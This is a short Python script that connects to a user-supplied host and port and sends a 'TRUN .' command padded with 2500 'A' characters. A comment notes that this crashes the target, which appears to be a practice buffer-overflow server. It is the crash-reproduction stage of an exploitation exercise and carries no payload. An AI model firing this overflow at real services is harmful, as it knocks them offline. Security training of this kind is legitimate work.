#!/usr/bin/env python3

import sys, socket

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

filler = 'TRUN' + ' .' + 'A'*2500 + '\n' # Testing shows you need \n or \x0A to send

# Noted that 2500 \x41 crashes program. Use that as buffer size

try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect((host, port)) # Connect to user supplied port and IP address
	print(client.recv(1024))	
	print("Sending buffer..")
	client.send(filler.encode('latin-1'))
	print(client.recv(1024))

except:
	print("Cannot connect!")
	sys.exit(0)

client.close()
